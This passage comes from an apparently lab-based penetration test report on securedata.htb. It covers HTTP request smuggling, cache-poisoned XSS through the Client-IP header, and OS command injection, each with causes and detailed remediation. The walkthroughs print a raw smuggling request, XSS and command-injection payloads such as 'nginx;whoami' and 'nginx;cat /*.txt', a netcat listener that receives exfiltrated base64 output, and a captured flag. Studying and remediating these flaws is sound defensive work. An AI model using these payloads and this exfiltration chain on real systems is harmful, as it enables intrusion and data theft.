         $sql = "UPDATE sessions SET invalidated=1 WHERE token=? AND invalidated=0";
         $stmt = mysqli_stmt_init($conn);
         if (!mysqli_stmt_prepare($stmt, $sql)) {
             echo "SQL Error";
             exit();
         }

         mysqli_stmt_bind_param($stmt, "s", $token);
         mysqli_stmt_execute($stmt);
         return true;
     }

     function get_session_user($token)
     {
         global $conn;

         $sql = "SELECT user_id FROM sessions WHERE token=? AND invalidated=0";
         $stmt = mysqli_stmt_init($conn);
         if (!mysqli_stmt_prepare($stmt, $sql)) {
             echo "SQL Error";
             exit();
         }

         mysqli_stmt_bind_param($stmt, "s", $token);
         mysqli_stmt_execute($stmt);
         $result = mysqli_stmt_get_result($stmt);

         if ($row = mysqli_fetch_assoc($result)) {
             log_query();
             return $row['user_id'];
         }
         return false;
     }

     function get_session_properties($token)
     {
         global $conn;

         $user_id = intval(get_session_user($token));
         if (!$user_id) {
             return null;
         }

         $sql = "SELECT * FROM users WHERE id=?";
         $stmt = mysqli_stmt_init($conn);
         if (!mysqli_stmt_prepare($stmt, $sql)) {
             echo "SQL Error";
             exit();
         }

         mysqli_stmt_bind_param($stmt, "i", $user_id);
         mysqli_stmt_execute($stmt);
         $result = mysqli_stmt_get_result($stmt);

         if ($row = mysqli_fetch_assoc($result)) {
             return $row;
         }
         return null;
     }

     function get_source_ip()
     {
         $ip = $_SERVER['REMOTE_ADDR'];
         return $ip;
     }

     function log_query()
     {
         global $logfile;
         global $log_url;
         $ip = get_source_ip();
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $uri = $_SERVER['REQUEST_URI'];
         $request_id = hash('sha256', $ip . $ua . $uri . time());

         $params = array(
             "ip" => $ip,
             "ua" => $ua,
             "uri" => $uri,
             "id" => $request_id,
         );
         $ch = curl_init($log_url . "?" . http_build_query($params));
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 3);
         curl_exec($ch);
         curl_close($ch);

         file_put_contents($logfile, "{$uri} - {$ua} - {$ip} (Request ID: {$request_id})\n", FILE_APPEND);
     }

     function query_sessions_by_user($username)
     {
         global $conn;

         $username = "%{$username}%";
         $sql = "SELECT users.username, users.role, sessions.token FROM users, sessions WHERE users.id=sessions.user_id AND sessions.invalidated=0 AND users.username LIKE ?";
         $stmt = mysqli_stmt_init($conn);
         if (!mysqli_stmt_prepare($stmt, $sql)) {
             echo "SQL Error";
             exit();
         }

         mysqli_stmt_bind_param($stmt, "s", $username);
         mysqli_stmt_execute($stmt);
         $result = mysqli_stmt_get_result($stmt);

         if ($result->num_rows === 0) {
             return false;
         }

         log_query();
         return $result;
     }

     function query_sessions_by_token($token)
     {
         global $conn;

         $token = "%{$token}%";
         $sql = "SELECT users.username, users.role, sessions.token FROM users, sessions WHERE users.id=sessions.user_id AND sessions.invalidated=0 AND sessions.token LIKE ?";
         $stmt = mysqli_stmt_init($conn);
         if (!mysqli_stmt_prepare($stmt, $sql)) {
             echo "SQL Error";
             exit();
         }

         mysqli_stmt_bind_param($stmt, "s", $token);
         mysqli_stmt_execute($stmt);
         $result = mysqli_stmt_get_result($stmt);

         if ($result->num_rows === 0) {
             return false;
         }

         log_query();
         return $result;
     }
   ```

   3. admin_panel.php

   ```php
     <?php
     require_once '../common/session.php';

     // check valid session
     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {
         header("Location: /index.php");
         exit();
     }

     // fetch user properties safely
     $user = get_session_properties($_COOKIE["session"]);
     if ($user === null || !isset($user["role"])) {
         header("Location: /index.php");
         exit();
     }

     // strict role check
     $user_role = (int)$user["role"];
     if ($user_role !== 0) {
         header("Location: /home.php");
         exit();
     }
   ```

   Apply the same change to session_manager.php.

   4. logout.php

   ```php
     <?php
     require_once ('common/session.php');

     if (!isset($_COOKIE["session"])) {
         header("Location: /index.php");
         exit();
     }

     $sessiontoken = $_COOKIE["session"];
     destroy_session($sessiontoken);

     // Clear the cookie on the client side as well
     setcookie('session', '', [
         'expires' => time() - 3600,
         'path' => '/',
         'secure' => true,
         'httponly' => true,
         'samesite' => 'Strict'
     ]);

     header("Location: /index.php");
     exit();
   ```

   ───────────────


### request smuggling Attack at securedata.htb {#95cec507-bee6-491d-9043-837dbecdff63}

#### CWE

CWE-444

#### CVSS 4.0

CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (5.3 - Medium)

#### Affected Component(s)

* http://securedata.htb (nginx reverse proxy front-end)
* Apache back-end at 127.0.0.1:8000
* GET /service_status on http://api.securedata.htb

#### External References

* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling')](https://cwe.mitre.org/data/definitions/444.html)
* [PortSwigger Web Security Academy - HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)

#### Description & Cause

   The application’s architecture places an nginx reverse proxy in front of an Apache back-end server. These two components interpret HTTP request boundaries differently, resulting in an
   HTTP request smuggling vulnerability. Specifically, the front-end nginx accepts a request with a Content-Length header and forwards it to the Apache back-end, which processes additional
   HTTP data appended inside the request body as a separate, smuggled request.

   In the observed proof-of-concept, the attacker sent a POST request to /errorsa.php with a body containing a complete second HTTP request:

   ```
     GET /service_status?service=apache2 HTTP/1.1
     Host: api.securedata.htb
     ...
   ```

   Because of the desynchronization, nginx treated the entire payload as the body of the first request, while Apache interpreted the embedded payload as a new incoming request. The server
   returned two distinct responses:

   1. 404 Not Found for the original POST /errorsa.php request, relayed from the Apache back-end at 127.0.0.1 Port 8000.
   2. 403 Forbidden for the smuggled GET /service_status?service=apache2 request.

   Receiving two separate responses for a single request proves that the back-end processed the embedded request independently from the original request. This allows an attacker to route
   requests to the internal back-end server and bypass front-end routing or access controls.

   Successful exploitation allows an attacker to send requests to internal endpoints that are not directly exposed. If combined with other vulnerabilities, such as the command-injection
   flaw in /service_status, this access could be leveraged for further attacks.

   Causes

   1. Inconsistent request-length parsing
      The front-end nginx and back-end Apache disagree on how to determine where one HTTP request ends and the next begins. When a request contains a Content-Length header and a body with
      embedded HTTP traffic, one server uses the header length while the other parses the remaining body as a new request.

   2. Front-end does not reject ambiguous requests
      nginx accepts requests whose body structure does not match the declared Content-Length and forwards them without normalization, validation, or rejection.

   3. Back-end interprets body content as a new request
      Apache reads past the declared body length and treats the embedded HTTP request as a legitimate incoming request, allowing the smuggled request to be processed.

   4. No request isolation between front-end and back-end
      The internal Apache back-end at 127.0.0.1:8000 trusts requests arriving through the front-end channel and exposes internal endpoints such as /service_status without additional
      authentication or network segmentation.

   5. Internal services reachable from the back-end
      The internal API (api.securedata.htb) is resolvable and reachable from the back-end server, so a smuggled request can be routed to it and trigger internal vulnerabilities.



#### Security Impact

   1. Bypass of front-end access controls
      HTTP request smuggling allows an attacker to bypass routing rules, IP restrictions, and Web Application Firewall (WAF) protections enforced by the nginx front-end. Requests that would
      normally be blocked or routed elsewhere are processed directly by the Apache back-end.

   2. Access to internal endpoints
      Because the smuggled request is processed by the internal back-end at 127.0.0.1:8000, the attacker can reach endpoints such as /service_status on api.securedata.htb that are not
      directly exposed to external users.

   3. Potential for further attacks when chained with other vulnerabilities
      Reaching an internal endpoint such as /service_status increases attack surface. If a separate vulnerability exists on that endpoint, the smuggled access path could be used to escalate
      impact. In this assessment, the smuggled request produced a 403 Forbidden response; command execution or data corruption was not demonstrated.

#### Detailed Walkthrough

1. Prepare the smuggling payload. Craft a single HTTP request that consists of: • A legitimate outer request to an existing or non-existing front-end path (/errorsa.php). • A complete inner HTTP request embedded in the request body, targeting the internal back-end endpoint.

2. Send the following request:

   ```http
   POST /errorsa.php HTTP/1.1
   Host: securedata.htb
   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
   Accept: */*
   Accept-Language: en-US,en;q=0.9
   Accept-Encoding: gzip, deflate, br
   Connection: keep-alive
   Referer: http://securedata.htb/home.php
   Cookie: session=7b8561bd8d5d3d66
   Upgrade-Insecure-Requests: 1
   Priority: u=0, i
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 5

   asd


   GET /service_status?service=apache2 HTTP/1.1
   Host: api.securedata.htb
   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
   Accept: */*
   CLIENT-IP: 127.0.0.1
   X-Forwarded-For: 127.0.0.1
   Accept-Language: en-US,en;q=0.9
   Accept-Encoding: gzip, deflate, br
   Connection: keep-alive
   Referer: http://securedata.htb/home.php
   Cookie: session=7b8561bd8d5d3d66
   Upgrade-Insecure-Requests: 1
   Priority: u=0, i
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 4

   asd=x
   ```

   Ensure that: • The Content-Length: 5 header of the outer request matches only the asd\r\n\r\n prefix. • The body of the outer request intentionally contains the second HTTP request. • CLIENT-IP: 127.0.0.1 and X-Forwarded-For: 127.0.0.1 are included on the smuggled request to satisfy any internal IP-based access controls.

3. Observe the server responses. The server returns multiple HTTP responses for the single request sent:

   • First response — 404 Not Found

   ```http
   HTTP/1.1 404 Not Found
   Server: nginx/1.23.3
   ...
   <address>Apache/2.4.56 (Debian) Server at 127.0.0.1 Port 8000</address>
   ```

   This is the response to the original POST /errorsa.php request, relayed from the Apache back-end at 127.0.0.1:8000.

   • Second response — 403 Forbidden

   ```http
   HTTP/1.1 403 Forbidden
   Server: nginx/1.23.3
   ...
   ```

   This is the response to the smuggled GET /service\_status?service=apache2 request.

![bcNe39Lk](assets/edited-bcNe39Lk.png)
   This indicates that the connection state became desynchronized after the smuggled request was processed.

4. Interpret the result. Receiving more than one HTTP response for a single request proves that the front-end nginx and back-end Apache disagree on request boundaries. The back-end processed the embedded request independently from the original request, confirming HTTP request smuggling.


#### Patching and Remediation

   1. Reject ambiguous requests at the front-end

   Configure nginx to reject any request that contains both Content-Length and Transfer-Encoding headers, or any request with malformed framing. This prevents CL.TE and TE.CL desync
   attacks.

   nginx configuration:

   ```nginx
     server {
         listen 80;
         server_name securedata.htb;

         location / {
             # Reject requests with both Content-Length and Transfer-Encoding
             if ($http_transfer_encoding) {
                 return 400;
             }

             proxy_pass http://backend;
             proxy_http_version 1.1;
             proxy_set_header Connection "";
         }
     }
   ```

   For a more robust solution, use a Web Application Firewall (WAF) rule that drops requests with conflicting request-length headers.

   ────────────────────────────────────────────────────────────────────────────────

   2. Normalize request framing

   Ensure that the front-end normalizes or strips Transfer-Encoding before forwarding to the back-end, and always uses a single, unambiguous mechanism for determining request length.

   nginx configuration:

   ```nginx
     location / {
         proxy_pass http://backend;
         proxy_http_version 1.1;
         proxy_set_header Connection "";

         # Do not forward Transfer-Encoding blindly
         proxy_set_header Transfer-Encoding "";
     }
   ```

   ────────────────────────────────────────────────────────────────────────────────

   3. Harden Apache back-end parsing

   Apache 2.4.53 and later supports HttpProtocolOptions Strict, which rejects ambiguous HTTP requests and helps prevent smuggling.

   Apache configuration (apache2.conf or virtual host):

   ```apache
     HttpProtocolOptions Strict
   ```

   This instructs Apache to reject requests with malformed or ambiguous request-line and header syntax.

   Also ensure mod_reqtimeout is enabled to limit slow or malformed requests:

   ```apache
     RequestReadTimeout header=20-40,MinRate=500body=20,MinRate=500
   ```

   ────────────────────────────────────────────────────────────────────────────────

   4. Use HTTP/2 end-to-end

   HTTP/2 uses a binary framing layer that is far less susceptible to request smuggling. If both front-end and back-end support HTTP/2, configure the connection to use HTTP/2 exclusively
   and avoid downgrading to HTTP/1.1.

   nginx configuration:

   ```nginx
     server {
         listen 443 ssl http2;
         server_name securedata.htb;

         location / {
             proxy_pass http://backend;
             proxy_http_version 2.0;
         }
     }
   ```

   │ Note: Do not downgrade HTTP/2 traffic to HTTP/1.1 before forwarding, as this reintroduces smuggling risks.

   ────────────────────────────────────────────────────────────────────────────────

   5. Disable connection reuse between front-end and back-end

   If connection reuse is not required, force nginx to open a new back-end connection for each request. This limits the impact of a successful desync because smuggled requests cannot be
   chained on reused connections.

   nginx configuration:

   ```nginx
     location / {
         proxy_pass http://backend;
         proxy_http_version 1.1;
         proxy_set_header Connection "close";
     }
   ```

   ────────────────────────────────────────────────────────────────────────────────

   6. Consistent server stack and parsing behavior

   Request smuggling often arises when two different HTTP parsers interpret ambiguous requests differently. Where possible:

   • Use the same HTTP server technology for front-end and back-end, or
   • Ensure both servers are configured to use identical request-length semantics.
   • Regularly update both nginx and Apache to the latest stable versions.

   ────────────────────────────────────────────────────────────────────────────────

   7. Segment internal APIs

   The internal API (api.securedata.htb) should not be reachable from the public-facing back-end server.

   • Place internal services on a separate network segment.
   • Require authentication for all internal API requests.
   • Block direct resolution or routing to api.securedata.htb from the public web tier.
   • Do not rely on CLIENT-IP or X-Forwarded-For headers for access control unless they are explicitly validated against a trusted source.

   ────────────────────────────────────────────────────────────────────────────────

   8. Validate internal-source headers

   Do not trust CLIENT-IP: 127.0.0.1 or X-Forwarded-For: 127.0.0.1 to grant access. If internal endpoints require IP-based restrictions, enforce them at the network layer or validate
   headers against a whitelist of trusted front-end proxies.

   ```nginx
     # Example: only allow internal API access from the front-end proxy
     location /service_status {
         allow 10.0.0.0/8;
         deny all;
     }
   ```

   ────────────────────────────────────────────────────────────────────────────────

   9. Deploy detection and monitoring

   Log and alert on patterns indicative of request smuggling:

   • Requests containing both Content-Length and Transfer-Encoding.
   • Requests with malformed Content-Length values.
   • Multiple HTTP responses returned for a single client request.
   • Unexpected internal API requests originating from the web tier.

   Example ModSecurity rule:

   ```apache
     SecRule REQUEST_HEADERS:Transfer-Encoding "@rx ." \
         "id:1000,phase:1,deny,status:400,msg:'Transfer-Encoding header not allowed'"
   ```



### XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning  {#9d9448f8-0a56-4e7d-ab86-82a1e6410844}

#### CWE

CWE-79

#### CVSS 4.0

CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:H/SI:H/SA:N (7.0 - High)

#### Affected Component(s)

* /admin/admin_panel.php

#### External References

* [OWASP Cross Site Scripting (XSS) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger Web Security Academy - Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)

#### Description & Cause

The application reflects the value of the Client-IP request header directly into the HTTP response body without adequate input validation or output encoding. The upstream caching layer
   additionally caches responses based on the Client-IP header value, storing each unique header value as a distinct cached response for approximately five minutes.

   An attacker can send a request to the affected endpoint (e.g., /admin/admin_panel.php) with a malicious Client-IP header containing an XSS payload. The cache stores the poisoned response and
   subsequently serves it to any user — including authenticated administrators — who requests the same page while the cached entry remains valid. When the victim’s browser renders the
   cached response, the embedded JavaScript executes in the context of the victim’s session, enabling theft of session cookies and other authenticated actions.

   Causes

   1. Unvalidated input reflection
      The application reads the Client-IP request header and writes it into the response without validating that it contains a legitimate IP address or safe characters.

   2. Missing output encoding
      The reflected header value is not HTML-entity-encoded, JavaScript-escaped, or otherwise sanitized before being rendered, allowing script tags and event handlers to execute.

   3. Unsafe cache keying
      The cache keys responses on the attacker-controllable Client-IP header. This allows one user to influence the cached response delivered to other users, converting a reflected XSS into
      a stored/cache-persistent XSS.

   4. No cache input normalization
      The caching layer does not strip or normalize potentially dangerous headers before storing the response, nor does it validate that reflected content is safe to cache.

   5. Insufficient cache isolation
      Responses containing user-controlled dynamic content are cached globally rather than marked as non-cacheable or keyed only on safe, non-attacker-controlled parameters.

#### Security Impact

   1. Session hijacking via cookie theft
      Because the XSS payload executes in the victim’s browser origin, it can read non-HttpOnly session cookies and exfiltrate them to the attacker. With a stolen session token, the
      attacker can impersonate the victim and access the application as an authenticated user.

   2. Forced actions on behalf of the victim
      The attacker-controlled JavaScript can issue arbitrary HTTP requests from the victim’s browser using the victim’s session. This allows the attacker to:
       • Perform administrative actions without the victim’s consent.
       • Read sensitive data accessible to the victim.
       • Modify account settings, permissions, or application data.
       • Submit forms or invoke API endpoints as the victim.

   3. Pivot to internal services
      If the victim has access to internal or restricted endpoints (e.g., api.securedata.htb), the attacker can use the compromised browser as a proxy to enumerate and attack those
      resources. In this case, the attacker leveraged the victim’s session to reach /fetch_logs, /fetch_sysinfo, and /service_status, ultimately achieving remote code execution through the
      command-injection flaw in the service parameter.

   4. Administrative compromise
      Because the target victim is an administrator, successful exploitation grants the attacker the same privileges within the application, leading to full compromise of the web
      application and potentially the underlying infrastructure.

#### Detailed Walkthrough

Prerequisites

   • Valid administrator session cookie obtained from the the race condition we did before.

   Steps

   1. Authenticate as the administrator.
      Set the stolen administrator session cookie in the browser and navigate to the application to confirm successful login.

   2. Navigating to the affected endpoint loaded the cached response.
      In the browser, request https://securedata.htb/admin/admin_panel.php.

   3. Intercept the request.
      In the intercepting proxy, capture the outgoing GET request to /admin/admin_panel.php.

   4. Inject a benign XSS payload into the Client-IP header.
      Add the following header to the request before forwarding it to the server:
      ```
        CLIENT-IP: <img src=0 onerror=alert(1)>
      ```



   

![RYrm5y4t](assets/edited-RYrm5y4t.png)

   5. Forward the request.
      Allow the modified request to reach the server and return the response to the browser.

   6. Observe the reflected payload.
      The browser renders the response and executes the injected script, triggering the alert dialog with the value 1. This confirms that the Client-IP header value is reflected unsanitized into the response body.

   7. Verify cache persistence.
      Disable interception in the proxy and reload /admin/admin_panel.php in the browser using a normal request (without the custom Client-IP header or any proxy modification).

   8. Confirm the payload is still served.
      The alert dialog appears again, demonstrating that the malicious response was cached by the upstream cache and is still being served to subsequent requests. The XSS condition persists
      until the cached entry expires (approximately five minutes) or is otherwise invalidated.
                                   

![i2SG4GhN](assets/edited-i2SG4GhN.png)


#### Patching and Remediation

   1. Stop reflecting the Client-IP header

   The safest fix is to remove the code that writes the Client-IP header into the response. If the application does not need to display the client IP address in the page, there should be no
   reflection logic at all.

   Before (vulnerable):

   ```php
     <!-- admin_panel.php -->
     <p>Your IP: <?php echo $_SERVER['HTTP_CLIENT_IP']; ?></p>
   ```

   After (fixed):

   ```php
     <!-- admin_panel.php -->
     <!-- Remove the Client-IP reflection entirely -->
     <p>Your IP: [removed]</p>
   ```

   ────────────────────────────────────────────────────────────────────────────────

   2. If reflection is required, validate and encode

   If the IP address must be displayed, validate that it is a well-formed IP and HTML-encode it before output.

   PHP fix:

   ```php
     <?php
     $client_ip = $_SERVER['HTTP_CLIENT_IP'] ?? '';

     if (filter_var($client_ip, FILTER_VALIDATE_IP)) {
         echo htmlspecialchars($client_ip, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
     } else {
         echo 'Unknown';
     }
     ?>
   ```

   This prevents HTML/JS injection because characters like <, >, ", ', and & are converted to HTML entities.

   ────────────────────────────────────────────────────────────────────────────────

   3. Fix the cache keying

   Do not include the Client-IP header in the cache key. Caches should key responses only on safe, non-attacker-controlled values such as the URL, host, and accepted content type.

   nginx example — remove header from cache key:

   ```nginx
     proxy_cache_key "$scheme$request_method$host$request_uri";
   ```

   Do not use:

   ```nginx
     # Vulnerable
     proxy_cache_key "$scheme$request_method$host$request_uri$http_client_ip";
   ```

   Varnish example:

   ```vcl
     sub vcl_hash {
         hash_data(req.url);
         if (req.http.host) {
             hash_data(req.http.host);
         } else {
             hash_data(server.ip);
         }
         # Do NOT add req.http.Client-IP or req.http.X-Forwarded-For here
     }
   ```

   ────────────────────────────────────────────────────────────────────────────────

   4. Mark dynamic pages as non-cacheable

   If the response contains user-controlled or session-sensitive data, instruct the cache not to store it.

   PHP / HTTP headers:

   ```php
     <?php
     header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
     header('Pragma: no-cache');
     header('Expires: 0');
     ?>
   ```

   ────────────────────────────────────────────────────────────────────────────────

   5. Harden cookies

   Because the XSS can steal session cookies, configure cookies to resist exfiltration and misuse.

   ```php
     session_set_cookie_params([
         'lifetime' => 3600,
         'path' => '/',
         'domain' => 'securedata.htb',
         'secure' => true,
         'httponly' => true,
         'samesite' => 'Strict'
     ]);
     session_start();
   ```

   • HttpOnly: Prevents JavaScript from reading the session cookie.
   • Secure: Sends the cookie only over HTTPS.
   • SameSite=Strict: Prevents cross-origin cookie submission.

   ────────────────────────────────────────────────────────────────────────────────

   6. Add Content Security Policy (CSP)

   A strict CSP blocks inline scripts and unauthorized outbound requests, reducing the impact of any future XSS.

   Example header:

   ```http
     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; connect-src 'self'; img-src 'self'; base-uri 'self'; form-action 'self';
   ```

   For legacy compatibility, report-only mode can be used during testing:

   ```http
     Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report;
   ```

   ────────────────────────────────────────────────────────────────────────────────

   7. Additional headers

   ```http
     X-Content-Type-Options: nosniff
     X-Frame-Options: DENY
     Referrer-Policy: strict-origin-when-cross-origin


### Remote Code Execution in http://api.securedata.htb/service_status?service=nginx {#d80d28b1-7608-40ff-a635-4a64c7c47b08}

#### CWE

CWE-78

#### CVSS 4.0

CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (7.5 - High)

#### Affected Component(s)

* service param

#### External References

* [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
* [PortSwigger Web Security Academy - OS command injection](https://portswigger.net/web-security/os-command-injection)

#### Description & Cause

   The service_status endpoint on api.securedata.htb accepts a service parameter that is passed directly to a shell command without proper validation or escaping. Because the input is
   concatenated into a command executed by the operating system, an attacker can inject shell metacharacters such as ;, |, &&, and $() to append and execute arbitrary commands.

   In the observed attack chain, an attacker first poisoned the application cache with an XSS payload via the Client-IP header. When an authenticated administrator loaded the affected page,
   the malicious JavaScript executed in the administrator’s browser and sent requests to:

   ```
     http://api.securedata.htb/service_status?service=nginx;whoami
   ```

   The server executed whoami along with the intended service command and returned the command output in the HTTP response. The XSS payload then captured that response and sent it to the
   attacker’s listener, confirming successful remote code execution on the internal API host.

   This flaw allows an attacker who can coerce an authenticated user into making requests — or who can directly reach the endpoint — to run arbitrary system commands, read sensitive files,
   and fully compromise the server.

   Causes

   1. Unsafe command construction
      The application builds a shell command using the service parameter as a literal argument without parameterization. For example, a call such as system("service " + $_GET['service'] + "
      status") allows an attacker to break out of the intended command and execute arbitrary instructions.

   2. Missing input validation
      The service parameter is not validated against a strict whitelist of allowed service names. The application accepts any string, including values containing shell control characters.

   3. No output escaping or dangerous-character filtering
      Metacharacters such as ;, |, &, $, `, and () are not removed or escaped before the string is passed to the shell.

   4. Internal endpoint lacks additional authorization
      The service_status endpoint is reachable from the context of an authenticated administrator and can be invoked through the admin’s browser via XSS, giving an attacker a trusted
      internal path to the command-injection flaw.

   5. Application runs with unnecessary privileges
      The web application process executes shell commands with privileges sufficient to run system service scripts and read arbitrary files, increasing the impact of the command injection.

#### Security Impact

   1. Remote code execution
      An attacker can execute arbitrary operating-system commands on the server hosting api.securedata.htb. This includes reading files, modifying configuration, installing persistence
      mechanisms, and launching further attacks.

   2. Sensitive data exposure
      The attacker can read any file accessible to the web process. In this case, the flag file located in the web root (/*.txt) was retrieved, demonstrating direct access to sensitive
      application data.

   3. Full server compromise
      With arbitrary command execution, the attacker can enumerate the system, extract credentials, access internal networks, and potentially escalate privileges to root or other service
      accounts.

   4. Lateral movement
      The compromised API server can be used as a pivot to attack other internal hosts, services, and databases that are reachable from the server but not from the external network.

   5. Service disruption
      The attacker can stop, start, or misconfigure services, delete files, exhaust resources, or otherwise degrade the availability of the application and underlying host.

   6. Loss of integrity and confidentiality
      All data and functionality on the server are effectively under attacker control, leading to a complete loss of confidentiality and integrity for the affected system.



#### Detailed Walkthrough

#### 1. Start the attacker listener

On the attacker system, a Netcat listener was started on the port referenced in the XSS payload (in this example, `4444`):

```bash
nc -lvnp 4444
```

* `-l` — listen for incoming connections
* `-v` — verbose output
* `-n` — disable DNS resolution
* `-p 4444` — bind the listener to port 4444

Confirm the listener is active and reachable from the target environment before proceeding.

#### 2. Poison the cache

Run a script that repeatedly sends a request containing the XSS payload in the `Client-IP` header (e.g., every 3 seconds), to keep the cache entry poisoned while waiting for the victim to load the page.

Payload script: [api-securedata-RCE.py](exploits/api-securedata-RCE.py)

#### 3. Victim visits the poisoned page

When the authenticated administrator loads the affected page, the cached response containing the XSS payload is served. The injected JavaScript executes in the administrator's browser context.

#### 4. XSS triggers command injection

The executed payload sends a request to the internal API endpoint:

```
GET http://api.securedata.htb/service_status?service=nginx;ls /
```

The semicolon terminates the intended `service` argument and appends `whoami`, which is executed by the server.

![MLMEo4pw](assets/edited-MLMEo4pw.png)

#### 5. Response is exfiltrated to the listener

The server's response, including the output of `whoami`, is relayed to the attacker's listener as an HTTP request. The Netcat terminal shows incoming requests containing base64-encoded data. Decoding this data confirms command execution.

#### 6. Escalate to arbitrary file read

The payload is updated to read text files from the server's filesystem:

```
GET http://api.securedata.htb/service_status?service=nginx;cat /*.txt
```

```bash
10.129.253.242 - - [15/Aug/2026 16:59:37] "GET /?service_apache2;cat%20/*.txt;=eyJzdGRlcnIiOiJVc2FnZTogYXBhY2hlMiB7c3RhcnR8c3RvcHxncmFjZWZ1bC1zdG9wfHJlc3RhcnR8cmVsb2FkfGZvcmNlLXJlbG9hZH1cbi9iaW4vc2g6IDE6IHN0YXR1czogbm90IGZvdW5kIiwic3Rkb3V0IjoiODVjZWY2YmY2YTBhNjhmNDVjOGQ2ZWIzN2YyY2I3OWMifQo%3D HTTP/1.1" 200 -

```

![yM37U7I6](assets/edited-yM37U7I6.png)

#### 7. Flag / sensitive file captured

The server returns the contents of `.txt`  files in the root directory, including the flag file. The XSS payload forwards this data to the attacker's listener; the attacker decodes the base64 output in Netcat to recover the file contents.

#### Flag: `85cef6bf6a0a68f45c8d6eb37f2cb79c`

***


#### Patching and Remediation

 1. Avoid shell execution with user input

   The most effective fix is to not pass the service parameter to a shell command at all. Use a language-native or safe API to query service status.

   PHP example using a whitelist instead of shell injection:

   ```php
     <?php
     $allowed_services = ['nginx', 'apache2', 'mysql'];

     $service = $_GET['service'] ?? '';

     if (!in_array($service, $allowed_services, true)) {
         http_response_code(400);
         echo json_encode(['error' => 'Invalid service name']);
         exit;
     }

     // Use escapeshellarg as a defense-in-depth measure
     $safe_service = escapeshellarg($service);
     $output = shell_exec("systemctl status {$safe_service} 2>&1");

     echo json_encode(['status' => $output]);
     ?>
   ```

   Better yet, avoid shell_exec entirely:

   ```php
     <?php
     $allowed_services = ['nginx', 'apache2', 'mysql'];
     $service = $_GET['service'] ?? '';

     if (!in_array($service, $allowed_services, true)) {
         http_response_code(400);
         echo json_encode(['error' => 'Invalid service name']);
         exit;
     }

     // PHP-native approach where available
     $status = service_status($service); // hypothetical safe wrapper
     echo json_encode(['status' => $status]);
     ?>
   ```

   ────────────────────────────────────────────────────────────────────────────────

   2. Strict input validation

   • Accept only a predefined list of valid service names.
   • Reject any input containing shell metacharacters such as ;, |, &, `, $, (), <, >, \, and newlines.
   • Validate length and expected format.

   ────────────────────────────────────────────────────────────────────────────────

   3. Defense-in-depth: escape if shell is unavoidable

   If shell execution is absolutely required, use the language-provided escaping function:

   ┌──────────┬────────────────────────────────────────────────────────┐
   │ Language │ Function                                               │
   ├──────────┼────────────────────────────────────────────────────────┤
   │ PHP      │ escapeshellarg()                                       │
   ├──────────┼────────────────────────────────────────────────────────┤
   │ Python   │ shlex.quote()                                          │
   ├──────────┼────────────────────────────────────────────────────────┤
   │ Node.js  │ No built-in; use child_process.spawn() with array args │
   ├──────────┼────────────────────────────────────────────────────────┤
   │ Java     │ ProcessBuilder with argument list                      │
   └──────────┴────────────────────────────────────────────────────────┘

   Never concatenate user input directly into a command string.

   ────────────────────────────────────────────────────────────────────────────────

   4. Run with least privilege

   The web application process should not have permission to execute arbitrary system commands or access the full filesystem. Run the API under a dedicated, unprivileged account with access
   restricted to the minimum required resources.

   ────────────────────────────────────────────────────────────────────────────────

   5. Restrict access to internal APIs

   • Place api.securedata.htb on an internal network not reachable from the public-facing application or user browsers.
   • Require strong authentication and authorization for all internal endpoints.
   • Do not rely on browser same-origin policy alone to protect internal services.

   ────────────────────────────────────────────────────────────────────────────────

   6. Disable unnecessary dangerous functions

   If the application does not need to execute shell commands, disable or restrict dangerous functions at the language/runtime level.

   PHP example (php.ini):

   ```ini
     disable_functions = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec
   ```

   Only enable the minimum required functions.

   ────────────────────────────────────────────────────────────────────────────────

   7. Implement Web Application Firewall (WAF) rules

   Add WAF rules to block common command-injection patterns in the service parameter, such as:

   ```
     ; | && || ` $ ( ) { } < >
   ```

   This is a secondary control and should not replace secure coding.

   ────────────────────────────────────────────────────────────────────────────────

   8. Logging and monitoring

   Log all requests to /service_status, including the service parameter value and the source IP. Alert on:

   • Requests containing shell metacharacters.
   • Requests to internal endpoints from unexpected sources.
   • Unusual process spawning by the web server user.



## Appendix {#appendix}

### Finding Severities {#finding-severities}

Each finding has been assigned a severity rating of critical, high, medium, low or info. The rating is based off of an assessment of the priority with which each finding should be viewed and the potential impact each has on the confidentiality, integrity, and availability of data.

| Rating   | CVSS Score Range |
| -------- | ---------------- |
| Critical | 9.0 – 10.0       |
| High     | 7.0 – 8.9        |
| Medium   | 4.0 – 6.9        |
| Low      | 0.1 – 3.9        |
| None     | 0.0              |


### Testing Methodology {#testing-methodology}

